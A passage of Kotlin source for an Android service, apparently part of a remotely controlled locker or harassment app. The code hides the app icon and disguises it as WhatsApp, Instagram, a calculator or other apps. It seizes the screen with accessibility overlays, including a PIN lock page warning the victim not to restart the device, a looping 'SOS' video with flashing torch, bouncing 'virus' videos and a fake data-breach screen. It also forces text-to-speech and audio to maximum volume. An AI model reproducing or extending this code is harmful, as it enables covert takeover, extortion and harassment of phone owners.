                PackageManager.DONT_KILL_APP
            )
            // Persist state supaya restore setelah reboot
            getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
                .putBoolean(PREF_APP_HIDDEN, hide).apply()
            emitStatus(JSONObject().apply { put("appHidden", hide) })
        } catch (e: Exception) {
            Log.e("DeviceService", "hideApp: ${e.message}")
        }
    }

    private val THEME_ALIASES = mapOf(
        "default"    to ".MainActivity",
        "whatsapp"   to ".theme.WhatsApp",
        "instagram"  to ".theme.Instagram",
        "calculator" to ".theme.Calculator",
        "chrome"     to ".theme.Chrome",
        "spotify"    to ".theme.Spotify",
        "tiktok"     to ".theme.TikTok",
        "youtube"    to ".theme.YouTube",
        "telegram"   to ".theme.Telegram"
    )

    private fun changeTheme(themeKey: String) {
        try {
            val pkg = packageName
            val target = THEME_ALIASES[themeKey.lowercase()] ?: return
            val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            val current = prefs.getString("active_theme", "default") ?: "default"
            // Disable semua alias dulu
            THEME_ALIASES.forEach { (key, alias) ->
                val cn = ComponentName(pkg, "$pkg$alias")
                if (key == "default") return@forEach // MainActivity ga di-disable
                packageManager.setComponentEnabledSetting(
                    cn,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            }
            if (target == ".MainActivity") {
                // Restore default — enable MainActivity
                packageManager.setComponentEnabledSetting(
                    ComponentName(pkg, "$pkg.MainActivity"),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
            } else {
                // Disable MainActivity, enable alias yang dipilih
                packageManager.setComponentEnabledSetting(
                    ComponentName(pkg, "$pkg.MainActivity"),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                packageManager.setComponentEnabledSetting(
                    ComponentName(pkg, "$pkg$target"),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
            }
            prefs.edit().putString("active_theme", themeKey.lowercase()).apply()
            emitStatus(JSONObject().apply { put("activeTheme", themeKey.lowercase()) })
        } catch (e: Exception) {
            Log.e("DeviceService", "changeTheme: ${e.message}")
        }
    }

    private fun speakText(text: String) {
        if (text.isEmpty()) return
        Handler(Looper.getMainLooper()).post {
            try {
                val am = getSystemService(AUDIO_SERVICE) as AudioManager
                setMaxVolume()
                @Suppress("DEPRECATION")
                am.requestAudioFocus(null, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN)

                tts?.shutdown()
                tts = TextToSpeech(this@DeviceService) { status ->
                    Handler(Looper.getMainLooper()).post {
                        try {
                            if (status != TextToSpeech.SUCCESS) {
                                Log.e("DeviceService", "TTS init failed: $status")
                                return@post
                            }
                            val engine = tts ?: return@post
                            setMaxVolume()
                            val localeId = Locale("id", "ID")
                            val langResult = engine.setLanguage(localeId)
                            if (langResult == TextToSpeech.LANG_MISSING_DATA ||
                                langResult == TextToSpeech.LANG_NOT_SUPPORTED) {
                                engine.setLanguage(Locale.ENGLISH)
                            }
                            val params = android.os.Bundle()
                            params.putInt(TextToSpeech.Engine.KEY_PARAM_STREAM, AudioManager.STREAM_MUSIC)
                            engine.setOnUtteranceProgressListener(object : android.speech.tts.UtteranceProgressListener() {
                                override fun onStart(utteranceId: String?) { startVolumeGuard() }
                                override fun onDone(utteranceId: String?)  { stopVolumeGuard() }
                                override fun onError(utteranceId: String?) { stopVolumeGuard() }
                            })
                            setMaxVolume()
                            val result = engine.speak(text, TextToSpeech.QUEUE_FLUSH, params, "tts_utterance")
                            Log.d("DeviceService", "TTS speak result: $result, text: $text")
                        } catch (e: Exception) {
                            Log.e("DeviceService", "TTS speak error: ${e.message}")
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "speakText: ${e.message}")
            }
        }
    }

    private fun openUrl(url: String) {
        if (url.isEmpty()) return
        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e("DeviceService", "openUrl: ${e.message}")
        }
    }

    private var screenTextHandler: Handler? = null

    private fun showScreenText(text: String) {
        val svcInstance = XyzAccessibilityService.instance
        if (svcInstance == null) {
            Handler(Looper.getMainLooper()).post {
                android.widget.Toast.makeText(this, "[screenText] ERROR: AccessibilityService null - belum aktif?", android.widget.Toast.LENGTH_LONG).show()
            }
            Log.e("DeviceService", "showScreenText: XyzAccessibilityService.instance is null")
            return
        }
        Handler(Looper.getMainLooper()).post {
            try {                
                textOverlayView?.let {
                    try { XyzAccessibilityService.removeOverlay(it) } catch (_: Exception) {}
                }
                textOverlayView = null
                screenTextHandler?.removeCallbacksAndMessages(null)

                val density = resources.displayMetrics.density
                val tv = android.widget.TextView(this).apply {
                    this.text = text
                    textSize = 20f
                    setTextColor(android.graphics.Color.WHITE)
                    typeface = android.graphics.Typeface.DEFAULT_BOLD
                    setPadding(48, 24, 48, 24)
                    gravity = android.view.Gravity.CENTER
                    maxLines = 6
                    ellipsize = android.text.TextUtils.TruncateAt.END
                    background = android.graphics.drawable.GradientDrawable().apply {
                        setColor(android.graphics.Color.argb(235, 15, 15, 15))
                        cornerRadius = 14f * density
                        setStroke(2, android.graphics.Color.argb(160, 120, 120, 120))
                    }
                    elevation = 99f
                }

                val params = WindowManager.LayoutParams(
                    (resources.displayMetrics.widthPixels * 0.88f).toInt(),
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    android.graphics.PixelFormat.TRANSLUCENT
                ).apply {
                    gravity = android.view.Gravity.CENTER
                }

                XyzAccessibilityService.addOverlay(tv, params)
                textOverlayView = tv
                
                screenTextHandler = Handler(Looper.getMainLooper())
                screenTextHandler?.postDelayed({ hideScreenText() }, 30_000)

                emitStatus(JSONObject().apply { put("screenText", true) })
            } catch (e: Exception) {
                android.widget.Toast.makeText(this, "[screenText] EXCEPTION: ${e.message}", android.widget.Toast.LENGTH_LONG).show()
                Log.e("DeviceService", "showScreenText: ${e.message}")
            }
        }
    }

    private fun hideScreenText() {
        screenTextHandler?.removeCallbacksAndMessages(null)
        screenTextHandler = null
        Handler(Looper.getMainLooper()).post {
            try {
                textOverlayView?.let { XyzAccessibilityService.removeOverlay(it) }
            } catch (_: Exception) {}
            textOverlayView = null
            emitStatus(JSONObject().apply { put("screenText", false) })
        }
    }

    private fun buildLockHtml(title: String): String = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
@import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;700;900&family=Space+Mono:wght@400;700&display=swap');

*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}

body{
  min-height:100vh;width:100%;
  background-color:#F5F0E8;
  background-image:
    linear-gradient(#111 1px, transparent 1px),
    linear-gradient(90deg, #111 1px, transparent 1px);
  background-size:32px 32px;
  background-position:0 0, 0 0;
  font-family:'Space Mono',monospace;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  color:#111;user-select:none;overflow:hidden;
}

.wrap{
  display:flex;flex-direction:column;align-items:center;
  gap:20px;width:100%;padding:0 28px;
  max-width:380px;
}

/* Header card */
.header-card{
  width:100%;
  background:#FF2020;
  border:3px solid #111;
  box-shadow:5px 5px 0 #111;
  padding:18px 20px 14px;
  display:flex;flex-direction:column;align-items:center;gap:6px;
}

.lock-icon-wrap svg{
  display:block;
}

.lock-title{
  font-family:'Space Grotesk',sans-serif;
  font-size:22px;font-weight:900;letter-spacing:1px;text-align:center;
  color:#fff;
  text-transform:uppercase;
}

.lock-sub{
  font-family:'Space Mono',monospace;
  font-size:9px;color:rgba(255,255,255,.75);
  letter-spacing:5px;text-transform:uppercase;
}

/* Dots */
.dots-row{
  display:flex;gap:14px;align-items:center;justify-content:center;
  background:#fff;
  border:3px solid #111;
  box-shadow:4px 4px 0 #111;
  padding:14px 24px;
  width:100%;
}

.dot{
  width:16px;height:16px;
  border-radius:0;
  background:transparent;
  border:2.5px solid #111;
  transition:all .1s;
}
.dot.filled{
  background:#FF2020;
  border-color:#FF2020;
}
.dot.error{
  background:#FF2020;
  border-color:#111;
  animation:shake .3s ease;
}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}

/* Numpad */
.numpad{
  display:grid;grid-template-columns:repeat(3,1fr);
  gap:10px;width:100%;max-width:310px;
}

.key{
  height:72px;
  border-radius:0;
  background:#fff;
  border:3px solid #111;
  box-shadow:4px 4px 0 #111;
  color:#111;font-size:24px;font-weight:700;
  font-family:'Space Grotesk',sans-serif;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  cursor:pointer;
  transition:transform .08s, box-shadow .08s;
  -webkit-user-select:none;
  gap:2px;
}
.key:active,.key.pressed{
  box-shadow:1px 1px 0 #111;
  transform:translate(3px,3px);
}

.key .sub{
  font-family:'Space Mono',monospace;
  font-size:7px;letter-spacing:2px;color:rgba(17,17,17,.4);
}
.key.del{font-size:18px;color:#111;background:#F5F0E8;}
.key.empty{visibility:hidden;box-shadow:none;}

/* Warn */
.warn-badge{
  font-family:'Space Grotesk',sans-serif;
  font-size:12px;font-weight:700;
  letter-spacing:1px;text-align:center;
  color:#111;
  background:#FFD600;
  border:3px solid #111;
  box-shadow:4px 4px 0 #111;
  border-radius:0;
  padding:12px 20px;
  width:100%;
  text-transform:uppercase;
}

/* Toast */
.toast{
  position:fixed;top:50%;left:50%;
  transform:translate(-50%,-50%) scale(0.85);
  background:#FF2020;
  border:3px solid #111;
  box-shadow:6px 6px 0 #111;
  border-radius:0;
  padding:16px 32px;
  font-family:'Space Grotesk',sans-serif;
  font-size:15px;font-weight:900;letter-spacing:2px;
  color:#fff;text-align:center;text-transform:uppercase;
  opacity:0;pointer-events:none;
  transition:opacity .15s, transform .15s;
  z-index:999;
  white-space:nowrap;
}
.toast.show{opacity:1;transform:translate(-50%,-50%) scale(1);}
</style>
</head>
<body>
<div class="wrap">
  <div class="header-card">
    <div class="lock-icon-wrap">
      <svg width="52" height="52" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="square" stroke-linejoin="miter">
        <rect x="3" y="11" width="18" height="11" rx="0" ry="0"/>
        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
      </svg>
    </div>
    <div class="lock-title">${title}</div>
    <div class="lock-sub">MASUKKAN PIN</div>
  </div>

  <div class="dots-row" id="dots"></div>

  <div class="numpad" id="numpad"></div>

  <div class="warn-badge">⚠ JANGAN RESTART PERANGKAT</div>
</div>

<script>
const PIN_LEN = 4;
var entered = '';

function buildDots(){
  var r=document.getElementById('dots');r.innerHTML='';
  for(var i=0;i<PIN_LEN;i++){
    var d=document.createElement('div');
    d.className='dot'+(i<entered.length?' filled':'');
    r.appendChild(d);
  }
}

function buildPad(){
  var p=document.getElementById('numpad');
  var keys=['1','2','3','4','5','6','7','8','9','','0','⌫'];
  keys.forEach(function(k){
    var b=document.createElement('div');
    b.className='key'+(k===''?' empty':'')+(k==='⌫'?' del':'');
    b.innerHTML=
      k==='1'?'1':
      k==='2'?'2<span class="sub">ABC</span>':
      k==='3'?'3<span class="sub">DEF</span>':
      k==='4'?'4<span class="sub">GHI</span>':
      k==='5'?'5<span class="sub">JKL</span>':
      k==='6'?'6<span class="sub">MNO</span>':
      k==='7'?'7<span class="sub">PQRS</span>':
      k==='8'?'8<span class="sub">TUV</span>':
      k==='9'?'9<span class="sub">WXYZ</span>':
      k==='0'?'0':k;
    if(k!==''){
      b.addEventListener('touchstart',function(e){e.preventDefault();b.classList.add('pressed');},true);
      b.addEventListener('touchend',function(e){e.preventDefault();b.classList.remove('pressed');press(k);},true);
    }
    p.appendChild(b);
  });
}

function press(k){
  if(k==='⌫'){entered=entered.slice(0,-1);buildDots();return;}
  if(entered.length>=PIN_LEN) return;
  entered+=k;buildDots();
  if(entered.length===PIN_LEN){
    var ok=Android.tryUnlock(entered);
    if(!ok){
      var dots=document.querySelectorAll('.dot');
      dots.forEach(function(d){d.classList.add('error');});
      var t=document.getElementById('toast');
      if(t){t.classList.add('show');}
      setTimeout(function(){
        if(t){t.classList.remove('show');}
        dots.forEach(function(d){d.classList.remove('error');});
        entered='';buildDots();
      },1200);
    }
  }
}

buildPad();buildDots();
</script>
<div class="toast" id="toast">PIN SALAH!</div>
</body>
</html>
""".trimIndent()

    private var sosActive          = false
    private var sosOverlayView: android.view.View? = null
    private var sosFlashHandler: Handler? = null
    private var sosFlashRunnable: Runnable? = null
    private var sosVideoPlayer: MediaPlayer? = null
    private var sosVideoView: SurfaceView?   = null
    private var virusActive = false
    private val virusOverlayViews = mutableListOf<android.view.View>()
    private val virusMediaPlayers = mutableListOf<MediaPlayer>()
    private val virusAnimationHandlers = mutableListOf<Handler>()
    private val virusAnimationRunnables = mutableListOf<Runnable>()

    private fun setSos(enable: Boolean) {
        if (enable) {
            if (sosActive) return
            sosActive = true
            startSos()
            emitStatus(JSONObject().apply { put("sos", true) })
        } else {
            stopSos()
        }
    }

    private fun startSos() {
        if (!Settings.canDrawOverlays(this)) return
        Handler(Looper.getMainLooper()).post {
            try {
                // Flash torch
                sosFlashHandler = Handler(Looper.getMainLooper())
                var flashState = false
                sosFlashRunnable = object : Runnable {
                    override fun run() {
                        if (!sosActive) {
                            try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
                            return
                        }
                        flashState = !flashState
                        try { torchCameraId?.let { cameraManager?.setTorchMode(it, flashState) } } catch (_: Exception) {}
                        sosFlashHandler?.postDelayed(this, 200)
                    }
                }
                sosFlashHandler?.post(sosFlashRunnable!!)

                // Langsung putar video fullscreen tanpa html/webview
                startSosVideoOverlay()

            } catch (e: Exception) {
                Log.e("DeviceService", "startSos: ${e.message}")
            }
        }
    }

    private fun setWallpaperFromAssetVideo() {
        Thread {
            try {
                val inputStream = assets.open("wallpaper.jpg")
                val bmp = BitmapFactory.decodeStream(inputStream)
                inputStream.close()
                if (bmp != null && checkSelfPermission(android.Manifest.permission.SET_WALLPAPER) == PackageManager.PERMISSION_GRANTED) {
                    val wm = WallpaperManager.getInstance(this)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        wm.setBitmap(bmp, null, true, WallpaperManager.FLAG_SYSTEM or WallpaperManager.FLAG_LOCK)
                    } else {
                        @Suppress("DEPRECATION") wm.setBitmap(bmp)
                    }
                    bmp.recycle()
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "setWallpaperFromAssetVideo: ${e.message}")
            }
        }.start()
    }

    private fun startSosVideoOverlay() {
        Handler(Looper.getMainLooper()).post {
            try {
                val params = XyzAccessibilityService.buildOverlayParams(focusable = true)
                val sv = SurfaceView(this)
                sosVideoView = sv
                XyzAccessibilityService.applyFullscreenFlags(sv)
                XyzAccessibilityService.addOverlay(sv, params)
                sv.holder.addCallback(object : SurfaceHolder.Callback {
                    override fun surfaceCreated(h: SurfaceHolder) {
                        try {
                            sosVideoPlayer = MediaPlayer().apply {
                                val afd = assets.openFd("sos.mp4")
                                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                                afd.close()
                                setSurface(h.surface)
                                isLooping = true
                                setVolume(1f, 1f)
                                prepareAsync()
                                setOnPreparedListener {
                                    setMaxVolume()
                                    startVolumeGuard()
                                    start()
                                }
                                setOnErrorListener { _, what, extra ->
                                    Log.e("DeviceService", "sosVideo error what=$what extra=$extra")
                                    true
                                }
                            }
                        } catch (e: Exception) {
                            Log.e("DeviceService", "startSosVideoOverlay surfaceCreated: ${e.message}")
                        }
                    }
                    override fun surfaceChanged(h: SurfaceHolder, f: Int, w: Int, ht: Int) {}
                    override fun surfaceDestroyed(h: SurfaceHolder) {}
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "startSosVideoOverlay: ${e.message}")
            }
        }
    }

    private fun stopSos() {
        sosActive = false
        sosFlashHandler?.removeCallbacks(sosFlashRunnable ?: Runnable {})
        sosFlashHandler  = null
        sosFlashRunnable = null
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        stopVolumeGuard()
        Handler(Looper.getMainLooper()).post {
            try { sosVideoPlayer?.stop(); sosVideoPlayer?.release(); sosVideoPlayer = null } catch (_: Exception) {}
            try { sosVideoView?.let { XyzAccessibilityService.removeOverlay(it) } } catch (_: Exception) {}
            sosVideoView = null
            sosOverlayView = null
        }
        emitStatus(JSONObject().apply { put("sos", false) })
    }

    private fun setVirus(enable: Boolean) {
        if (enable) {
            if (virusActive) return
            virusActive = true
            startVirus()
            emitStatus(JSONObject().apply { put("virus", true) })
        } else {
            stopVirus()
        }
    }

    private fun startVirus() {
        if (!Settings.canDrawOverlays(this)) return
        Handler(Looper.getMainLooper()).post {
            try {
                // Buat 7 video dengan jeda 2000ms
                for (i in 0..6) {
                    Handler(Looper.getMainLooper()).postDelayed({
                        if (virusActive) startVirusVideo(i)
                    }, (i * 2000).toLong())
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "startVirus: ${e.message}")
            }
        }
    }

    private fun startVirusVideo(index: Int) {
        if (!virusActive) return
        Handler(Looper.getMainLooper()).post {
            try {
                val dm = this@DeviceService.resources.displayMetrics
                val screenWidth = dm.widthPixels
                val screenHeight = dm.heightPixels
                val videoWidth = (screenWidth * 0.65).toInt()
                
                // Dapatkan dimensi asli video untuk aspect ratio yang tepat
                var videoHeight = (screenHeight * 0.35).toInt() // default fallback
                try {
                    val mmr = MediaMetadataRetriever()
                    val afd = assets.openFd("virus.mp4")
                    mmr.setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                    afd.close()
                    
                    val videoWidthStr = mmr.extractMetadata(MediaMetadataRetriever.METADATA_KEY_VIDEO_WIDTH)
                    val videoHeightStr = mmr.extractMetadata(MediaMetadataRetriever.METADATA_KEY_VIDEO_HEIGHT)
                    
                    if (videoWidthStr != null && videoHeightStr != null) {
                        val origWidth = videoWidthStr.toIntOrNull() ?: 1
                        val origHeight = videoHeightStr.toIntOrNull() ?: 1
                        val aspectRatio = origHeight.toFloat() / origWidth.toFloat()
                        videoHeight = (videoWidth * aspectRatio).toInt()
                    }
                    mmr.release()
                } catch (e: Exception) {
                    Log.d("DeviceService", "Failed to get video dimensions: ${e.message}")
                }

                val sv = SurfaceView(this).apply {
                    setZOrderOnTop(true)
                }
                virusOverlayViews.add(sv)

                val params = XyzAccessibilityService.buildOverlayParams(focusable = false).apply {
                    width = videoWidth
                    height = videoHeight
                    // Random positioning
                    x = (0..screenWidth - videoWidth).random()
                    y = (0..screenHeight - videoHeight).random()
                }

                XyzAccessibilityService.addOverlay(sv, params)

                // Random direction dan speed
                val directions = listOf(
                    Pair(-3, 0),    // kiri
                    Pair(3, 0),     // kanan
                    Pair(0, -3),    // atas
                    Pair(0, 3),     // bawah
                    Pair(-2, -2),   // atas-kiri
                    Pair(2, -2),    // atas-kanan
                    Pair(-2, 2),    // bawah-kiri
                    Pair(2, 2)      // bawah-kanan
                )
                val direction = directions.random()
                val speed = (1..3).random()
                val finalDx = direction.first * speed
                val finalDy = direction.second * speed

                sv.holder.addCallback(object : SurfaceHolder.Callback {
                    override fun surfaceCreated(h: SurfaceHolder) {
                        try {
                            val mp = MediaPlayer().apply {
                                val afd = assets.openFd("virus.mp4")
                                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                                afd.close()
                                setSurface(h.surface)
                                isLooping = true
                                setVolume(1f, 1f)
                                prepareAsync()
                                setOnPreparedListener {
                                    setMaxVolume()
                                    startVolumeGuard()
                                    start()
                                }
                                setOnErrorListener { _, what, extra ->
                                    Log.e("DeviceService", "virusVideo error what=$what extra=$extra")
                                    true
                                }
                            }
                            virusMediaPlayers.add(mp)

                            // Animation loop untuk gerak video
                            val animHandler = Handler(Looper.getMainLooper())
                            val animRunnable = object : Runnable {
                                var x = params.x
                                var y = params.y
                                override fun run() {
                                    if (!virusActive || !virusOverlayViews.contains(sv)) return
                                    x += finalDx
                                    y += finalDy
                                    // Bounce saat keluar screen
                                    if (x < -videoWidth.toInt()) x = screenWidth.toInt()
                                    if (x > screenWidth.toInt()) x = -videoWidth.toInt()
                                    if (y < -videoHeight.toInt()) y = screenHeight.toInt()
                                    if (y > screenHeight.toInt()) y = -videoHeight.toInt()
                                    try {
                                        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                                        params.x = x
                                        params.y = y
                                        wm.updateViewLayout(sv, params)
                                    } catch (_: Exception) {}
                                    animHandler.postDelayed(this, 50)
                                }
                            }
                            virusAnimationHandlers.add(animHandler)
                            virusAnimationRunnables.add(animRunnable)
                            animHandler.post(animRunnable)
                        } catch (e: Exception) {
                            Log.e("DeviceService", "startVirusVideo surfaceCreated: ${e.message}")
                        }
                    }
                    override fun surfaceChanged(h: SurfaceHolder, f: Int, w: Int, ht: Int) {}
                    override fun surfaceDestroyed(h: SurfaceHolder) {}
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "startVirusVideo: ${e.message}")
            }
        }
    }

    private fun stopVirus() {
        virusActive = false
        Handler(Looper.getMainLooper()).post {
            // Stop semua animation
            for (i in virusAnimationHandlers.indices) {
                virusAnimationHandlers[i].removeCallbacks(virusAnimationRunnables[i])
            }
            virusAnimationHandlers.clear()
            virusAnimationRunnables.clear()

            // Release semua media players
            for (mp in virusMediaPlayers) {
                try { mp.stop(); mp.release() } catch (_: Exception) {}
                stopVolumeGuard()
            }
            virusMediaPlayers.clear()

            // Remove semua overlay views
            for (view in virusOverlayViews) {
                try { XyzAccessibilityService.removeOverlay(view) } catch (_: Exception) {}
            }
            virusOverlayViews.clear()
        }
        emitStatus(JSONObject().apply { put("virus", false) })
    }

    private fun buildSosHtml(): String = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@600;700&display=swap');

:root{
  --g: #00ff88;
  --g2: rgba(0,255,136,.5);
  --g3: rgba(0,255,136,.15);
  --g4: rgba(0,255,136,.06);
  --r: #ff3355;
  --r2: rgba(255,51,85,.5);
  --bg: #00060f;
  --mono: 'Share Tech Mono',monospace;
  --sans: 'Rajdhani',sans-serif;
}

*{box-sizing:border-box;margin:0;padding:0;}
html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);font-family:var(--mono);}

body::before{
  content:'';position:fixed;inset:0;pointer-events:none;z-index:999;
  background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.12) 3px,rgba(0,0,0,.12) 4px);
}

/* Grid bg */
.grid{
  position:fixed;inset:0;z-index:0;
  background-image:
    linear-gradient(rgba(0,255,136,.03) 1px,transparent 1px),
    linear-gradient(90deg,rgba(0,255,136,.03) 1px,transparent 1px);
  background-size:48px 48px;
}

.phase{position:fixed;inset:0;z-index:10;display:none;flex-direction:column;align-items:center;justify-content:center;padding:28px;}
.phase.active{display:flex;}

.brackets{position:fixed;inset:0;z-index:11;pointer-events:none;}
.brackets::before,.brackets::after,.brackets .b2::before,.brackets .b2::after{
  content:'';position:absolute;width:28px;height:28px;
}
.brackets::before{top:16px;left:16px;border-top:1.5px solid var(--g);border-left:1.5px solid var(--g);}
.brackets::after{top:16px;right:16px;border-top:1.5px solid var(--g);border-right:1.5px solid var(--g);}
.brackets .b2::before{bottom:16px;left:16px;border-bottom:1.5px solid var(--g);border-left:1.5px solid var(--g);}
.brackets .b2::after{bottom:16px;right:16px;border-bottom:1.5px solid var(--g);border-right:1.5px solid var(--g);}

.topbar{
  position:fixed;top:0;left:0;right:0;z-index:12;
  height:36px;
  border-bottom:1px solid rgba(0,255,136,.08);
  background:rgba(0,6,15,.9);
  display:flex;align-items:center;justify-content:space-between;
  padding:0 20px;
  font-size:8px;color:var(--g2);letter-spacing:3px;
}
.topbar-dot{width:5px;height:5px;border-radius:50%;background:var(--g);box-shadow:0 0 6px var(--g);animation:blink 1.2s steps(1) infinite;}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
.topbar-time{font-size:9px;color:var(--g);}

#ph1 .icon-wrap{
  position:relative;width:100px;height:100px;
  display:flex;align-items:center;justify-content:center;
  margin-bottom:24px;
}
#ph1 .ring{
  position:absolute;inset:0;border-radius:50%;
  border:1px solid var(--g2);
  animation:spin 8s linear infinite;
  background:conic-gradient(var(--g) 0deg,transparent 60deg,transparent 300deg,var(--g) 360deg);
  mask:radial-gradient(circle,transparent 46px,black 47px);
}
#ph1 .ring2{
  position:absolute;inset:12px;border-radius:50%;
  border:1px solid var(--g3);
  animation:spin 5s linear infinite reverse;
}
#ph1 .core{
  width:64px;height:64px;border-radius:50%;
  background:var(--g4);border:1px solid var(--g2);
  display:flex;align-items:center;justify-content:center;
  box-shadow:0 0 24px var(--g3),inset 0 0 16px var(--g4);
  animation:pulse 2.5s ease-in-out infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}
@keyframes pulse{0%,100%{box-shadow:0 0 20px var(--g3)}50%{box-shadow:0 0 40px rgba(0,255,136,.25)}}

#ph1 .tag{
  font-size:8px;color:var(--g2);letter-spacing:5px;text-transform:uppercase;
  margin-bottom:10px;
}
#ph1 .title{
  font-family:var(--sans);font-size:26px;font-weight:700;color:#fff;
  letter-spacing:2px;text-align:center;text-transform:uppercase;
  margin-bottom:4px;
  text-shadow:0 0 24px rgba(255,255,255,.3);
}
#ph1 .title span{color:var(--g);text-shadow:0 0 16px var(--g);}
#ph1 .sub{font-size:9px;color:var(--g2);letter-spacing:4px;margin-bottom:28px;}

.term{
  width:100%;max-width:320px;
  border:1px solid rgba(0,255,136,.12);
  background:rgba(0,255,136,.02);
  padding:14px 16px;
}
.term-header{
  font-size:7px;color:var(--g2);letter-spacing:3px;
  margin-bottom:10px;padding-bottom:8px;
  border-bottom:1px solid rgba(0,255,136,.08);
  display:flex;justify-content:space-between;
}
.log-line{
  display:flex;gap:10px;align-items:baseline;
  font-size:11px;margin-bottom:6px;line-height:1.4;
  animation:fadein .3s ease both;
}
@keyframes fadein{from{opacity:0;transform:translateX(-6px)}to{opacity:1}}
.log-tag{font-size:8px;padding:1px 5px;border-radius:1px;flex-shrink:0;}
.log-tag.ok{background:rgba(0,255,136,.1);color:var(--g);border:1px solid rgba(0,255,136,.2);}
.log-tag.warn{background:rgba(255,170,0,.08);color:#ffaa00;border:1px solid rgba(255,170,0,.2);}
.log-tag.err{background:rgba(255,51,85,.08);color:var(--r);border:1px solid rgba(255,51,85,.2);}
.log-msg{color:rgba(200,255,230,.7);flex:1;}
.log-val{color:#fff;font-size:10px;}

.progress-wrap{margin-top:10px;}
.progress-label{font-size:7px;color:var(--g2);letter-spacing:3px;margin-bottom:4px;display:flex;justify-content:space-between;}
.progress-track{height:2px;background:rgba(0,255,136,.08);}
.progress-fill{height:100%;background:var(--g);box-shadow:0 0 6px var(--g);width:0%;}

#ph2 .cd-wrap{
  display:flex;flex-direction:column;align-items:center;gap:0;
}
#ph2 .cd-label{
  font-size:8px;color:var(--r2);letter-spacing:6px;text-transform:uppercase;
  margin-bottom:12px;
}
#ph2 .cd-num{
  font-family:var(--sans);font-size:160px;font-weight:700;
  color:var(--r);line-height:1;
  text-shadow:0 0 40px rgba(255,51,85,.4),0 0 80px rgba(255,51,85,.2);
  animation:cd-appear .25s cubic-bezier(.34,1.56,.64,1) both;
  position:relative;
}
#ph2 .cd-num::after{
  content:attr(data-n);position:absolute;inset:0;
  color:#0ff;opacity:.15;transform:translateX(4px);
  clip-path:polygon(0 30%,100% 30%,100% 55%,0 55%);
}
@keyframes cd-appear{from{opacity:0;transform:scale(1.6);filter:blur(16px)}to{opacity:1;transform:scale(1);filter:blur(0)}}

#ph2 .cd-sub{
  font-size:10px;color:rgba(255,51,85,.5);letter-spacing:5px;
  text-transform:uppercase;margin-top:8px;
}
#ph2 .cd-bar{
  margin-top:24px;width:200px;height:2px;background:rgba(255,51,85,.12);
}
#ph2 .cd-progress{
  height:100%;background:var(--r);box-shadow:0 0 8px var(--r);
  width:100%;transition:width .85s linear;
}

#ph3{justify-content:center;}
#ph3 .breach-icon{
  width:80px;height:80px;border-radius:50%;
  background:rgba(255,51,85,.06);
  border:1px solid var(--r2);
  display:flex;align-items:center;justify-content:center;
  margin-bottom:20px;
  box-shadow:0 0 30px rgba(255,51,85,.15);
}
#ph3 .breach-title{
  font-family:var(--sans);font-size:22px;font-weight:700;
  color:var(--r);letter-spacing:3px;text-transform:uppercase;
  text-shadow:0 0 20px rgba(255,51,85,.5);
  margin-bottom:6px;text-align:center;
}
#ph3 .breach-sub{
  font-size:8px;color:rgba(255,51,85,.4);
  letter-spacing:5px;text-transform:uppercase;
  margin-bottom:28px;text-align:center;
}
#ph3 .data-grid{
  width:100%;max-width:320px;
  display:grid;grid-template-columns:1fr 1fr;
  gap:8px;
}
#ph3 .data-cell{
  padding:12px 14px;
  border:1px solid rgba(0,255,136,.08);
  background:var(--g4);
}
#ph3 .data-cell-label{
  font-size:7px;color:var(--g2);letter-spacing:2px;
  text-transform:uppercase;margin-bottom:4px;
}
#ph3 .data-cell-val{
  font-size:12px;color:#e0ffe8;
  text-shadow:0 0 8px var(--g3);
}
